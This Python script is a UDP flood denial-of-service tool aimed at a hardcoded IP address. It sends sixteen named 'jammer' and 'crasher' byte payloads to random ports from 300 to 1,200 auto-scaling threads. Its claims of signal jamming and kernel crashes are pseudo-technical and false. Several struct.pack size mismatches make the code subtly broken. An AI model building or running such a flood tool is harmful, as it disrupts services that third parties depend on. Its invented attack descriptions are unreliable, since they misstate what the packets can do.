import socket
import threading
import time
import random
import struct

# TARGET
target = "62.109.121.42"

# HEAVY SIGNAL JAMMING VIRUS PAYLOADS
VIRUS_JAMMERS = [
    # 1. HIGH-FREQUENCY JAMMER (HFJ)
    struct.pack("64B", *[
        0x48, 0x46, 0x4A, 0x31,  # "HFJ1" header
        *[random.randint(0x80, 0xFF) for _ in range(60)]  # High-frequency random
    ]),
    
    # 2. LOW-FREQUENCY JAMMER (LFJ)  
    struct.pack("64B", *[
        0x4C, 0x46, 0x4A, 0x31,  # "LFJ1" header
        *[random.randint(0x00, 0x3F) for _ in range(60)]  # Low-frequency random
    ]),
    
    # 3. PATTERN JAMMER (PATJ)
    struct.pack("64B", *[
        0x50, 0x41, 0x54, 0x4A,  # "PATJ" header
        *[0xAA, 0x55] * 30  # Alternating pattern
    ]),
    
    # 4. CLOCK JAMMER (CLKJ)
    struct.pack("64B", *[
        0x43, 0x4C, 0x4B, 0x4A,  # "CLKJ" header
        *[0xFF, 0x00, 0xFF, 0x00] * 15  # Clock signal
    ]),
    
    # 5. RANDOM NOISE JAMMER (RNJ)
    struct.pack("64B", *[
        0x52, 0x4E, 0x4A, 0x31,  # "RNJ1" header
        *[random.getrandbits(8) for _ in range(60)]  # True random
    ]),
    
    # 6. SYNCHRONIZATION JAMMER (SYNJ)
    struct.pack("64B", *[
        0x53, 0x59, 0x4E, 0x4A,  # "SYNJ" header
        0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E,  # Preamble
        0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,  # Sync words
        *[0xAA] * 48  # Data burst
    ]),
    
    # 7. CARRIER JAMMER (CRRJ)
    struct.pack("64B", *[
        0x43, 0x52, 0x52, 0x4A,  # "CRRJ" header
        *[0xFF] * 60  # Full carrier
    ]),
    
    # 8. MODULATION JAMMER (MODJ)
    struct.pack("64B", *[
        0x4D, 0x4F, 0x44, 0x4A,  # "MODJ" header
        *[i % 256 for i in range(60)]  # Sawtooth wave
    ]),
]

# HEAVY CRASHER VIRUS PAYLOADS
VIRUS_CRASHERS = [
    # 1. NULL POINTER CRASHER (NULC)
    struct.pack("64B", *[
        0x4E, 0x55, 0x4C, 0x43,  # "NULC" header
        *[0x00] * 60  # All nulls
    ]),
    
    # 2. MAX POINTER CRASHER (MAXC)
    struct.pack("64B", *[
        0x4D, 0x41, 0x58, 0x43,  # "MAXC" header
        *[0xFF] * 60  # All max
    ]),
    
    # 3. BUFFER OVERFLOW CRASHER (BUFC)
    struct.pack("256B", *[
        0x42, 0x55, 0x46, 0x43,  # "BUFC" header
        *[0x41] * 100,  # "A" buffer fill
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  # NOP sled
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  # INT3
        0xEB, 0xFE, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  # JMP -2
        *[0x42] * 100  # "B" overflow
    ]),
    
    # 4. STACK SMASHING CRASHER (STKC)
    struct.pack("128B", *[
        0x53, 0x54, 0x4B, 0x43,  # "STKC" header
        *[0x43] * 60,  # "C" fill
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # NULL return
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,  # Magic return
        *[0x44] * 40  # "D" overflow
    ]),
    
    # 5. HEAP CORRUPTION CRASHER (HEPC)
    struct.pack("192B", *[
        0x48, 0x45, 0x50, 0x43,  # "HEPC" header
        0x48, 0x45, 0x41, 0x50, 0x48, 0x45, 0x41, 0x50,  # "HEAPHEAP"
        *[0x45] * 80,  # "E" fill
        0x46, 0x52, 0x45, 0x45, 0x46, 0x52, 0x45, 0x45,  # "FREEFREE"
        0x4D, 0x41, 0x4C, 0x4C, 0x4F, 0x43, 0x4D, 0x41,  # "MALLOCMA"
        *[0x46] * 80  # "F" corruption
    ]),
    
    # 6. KERNEL PANIC CRASHER (KERC)
    struct.pack("96B", *[
        0x4B, 0x45, 0x52, 0x43,  # "KERC" header
        0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x50, 0x41,  # "KERNELPA"
        0x4E, 0x49, 0x43, 0x21, 0x00, 0x00, 0x00, 0x00,  # "NIC!"
        0x0D, 0xF0, 0xAD, 0x0B, 0x0D, 0xF0, 0xAD, 0x0B,  # DFADOB pattern
        0xCA, 0xFE, 0xBA, 0xBE, 0xCA, 0xFE, 0xBA, 0xBE,  # CAFEBABE
        *[0x47] * 60  # "G" panic data
    ]),
    
    # 7. DIVIDE BY ZERO CRASHER (DIVC)
    struct.pack("80B", *[
        0x44, 0x49, 0x56, 0x43,  # "DIVC" header
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Zero divisor
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  # Max dividend
        0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  # INT_MAX
        0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # INT_MIN
        *[0x48] * 48  # "H" remainder
    ]),
    
    # 8. MEMORY LEAK CRASHER (MEMC)
    struct.pack("144B", *[
        0x4D, 0x45, 0x4D, 0x43,  # "MEMC" header
        0x4C, 0x45, 0x41, 0x4B, 0x4C, 0x45, 0x41, 0x4B,  # "LEAKLEAK"
        0x41, 0x4C, 0x4C, 0x4F, 0x43, 0x41, 0x4C, 0x4C,  # "ALLOCALL"
        0x4F, 0x43, 0x4E, 0x45, 0x56, 0x45, 0x52, 0x46,  # "OCNEVERF"
        0x52, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45,  # "REEEEEEE"
        *[0x49] * 100  # "I" leaked memory
    ]),
]

# COMBINE ALL PAYLOADS
VIRUS_PAYLOADS = VIRUS_JAMMERS + VIRUS_CRASHERS

# AUTO-SCALING THREAD MANAGER
class VirusArmy:
    def __init__(self, target_ip, min_threads=300, max_threads=1200):
        self.target = target_ip
        self.min_threads = min_threads
        self.max_threads = max_threads
        self.current_threads = min_threads
        self.threads = []
        self.running = True
        self.stats = {"packets": 0, "jammers": 0, "crashers": 0}
        
    def virus_soldier(self, soldier_id):
        """Single virus attack thread"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # Select deadly payload
                payload = random.choice(VIRUS_PAYLOADS)
                
                # Random target port for maximum damage
                port = random.randint(1, 65535)
                
                # LAUNCH VIRUS
                sock.sendto(payload, (self.target, port))
                
                # Update stats
                self.stats["packets"] += 1
                if payload[:4] in [b"HFJ1", b"LFJ1", b"PATJ", b"CLKJ", b"RNJ1", b"SYNJ", b"CRRJ", b"MODJ"]:
                    self.stats["jammers"] += 1
                else:
                    self.stats["crashers"] += 1
                    
            except:
                # Recreate socket if broken
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except:
                    pass
    
    def adjust_army(self):
        """Auto-scale threads based on performance"""
        while self.running:
            time.sleep(5)  # Check every 5 seconds
            
            # Simple scaling: if sending fast, add more threads
            pps = self.stats["packets"] / 5
            self.stats = {"packets": 0, "jammers": 0, "crashers": 0}
            
            if pps > 50000 and self.current_threads < self.max_threads:
                # Add more soldiers
                add_count = min(50, self.max_threads - self.current_threads)
                for i in range(add_count):
                    t = threading.Thread(target=self.virus_soldier, args=(i,))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
                self.current_threads += add_count
                print(f"[+] Army expanded to {self.current_threads} soldiers")
            elif pps < 10000 and self.current_threads > self.min_threads:
                # Reduce army
                remove_count = min(25, self.current_threads - self.min_threads)
                self.current_threads -= remove_count
                print(f"[-] Army reduced to {self.current_threads} soldiers")
    
    def launch(self):
        """Launch the virus army"""
        print(f"☢️  VIRUS ARMY LAUNCHING AGAINST {self.target}")
        print(f"⚔️  Initial soldiers: {self.min_threads}")
        print(f"💀 Payloads: {len(VIRUS_PAYLOADS)} jammers/crashers")
        print("="*50)
        
        # Start initial army
        for i in range(self.min_threads):
            t = threading.Thread(target=self.virus_soldier, args=(i,))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Start auto-scaling manager
        scaler = threading.Thread(target=self.adjust_army)
        scaler.daemon = True
        scaler.start()

# LAUNCH THE VIRUS ARMY
army = VirusArmy(target, min_threads=300, max_threads=1200)
army.launch()

# SIMPLE LOGGING
last_log = time.time()
while True:
    time.sleep(1)
    elapsed = time.time() - last_log
    
    # Calculate attack stats
    pps = army.stats["packets"] / elapsed if elapsed > 0 else 0
    jam_ratio = army.stats["jammers"] / max(army.stats["packets"], 1) * 100
    crash_ratio = army.stats["crashers"] / max(army.stats["packets"], 1) * 100
    
    print(f"☢️  {army.current_threads} soldiers | {int(pps)}/s | JAM: {jam_ratio:.0f}% | CRASH: {crash_ratio:.0f}%")
    
    # Reset for next second
    last_log = time.time()
    army.stats = {"packets": 0, "jammers": 0, "crashers": 0}
